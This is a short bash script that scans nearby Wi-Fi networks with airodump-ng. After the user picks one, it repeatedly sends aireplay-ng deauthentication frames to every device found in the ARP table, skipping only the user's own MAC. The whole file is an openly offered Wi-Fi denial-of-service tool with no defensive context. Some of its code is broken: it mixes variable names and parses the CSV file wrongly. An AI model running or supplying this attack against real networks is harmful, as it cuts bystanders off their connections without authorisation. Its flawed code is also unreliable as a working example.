#!/bin/bash
echo 'Your network interface name?'
read interface
# airmon-ng start $interface
# airodump-ng $interface

sudo xterm -title "Deauth scanner" -e airodump-ng -w out --output-format csv $interface


bssids=($(grep -v 'BSSID' out-01.csv | awk '{print $1}'))
essids=($(grep -v 'BSSID' out-01.csv | awk '{print $4}'))

rm out-01.csv

echo "Available Wi-Fi Networks:"
select network in "${essids[@]}"; do
  bssid=${bssids[REPLY-1]}
  break
done

mac=$(ifconfig "$interface" | awk '/ether/ {print $2}')

WHITELIST=($mac)

while true; do
  DEVICES=($(arp -i $INTERFACE -n | tail -n +2 | cut -f 3 -d ' '))

  for DEVICE in "${DEVICES[@]}"; do
    skip=
    for MAC in "${WHITELIST[@]}"; do
        if [ "$DEVICE" == "$MAC" ]
        then
            skip=1; 
        fi
    done
    [ -n "$skip" ] && continue
    aireplay-ng -0 1 -a "$bssid" -c "$DEVICE" "$interface"
  done
done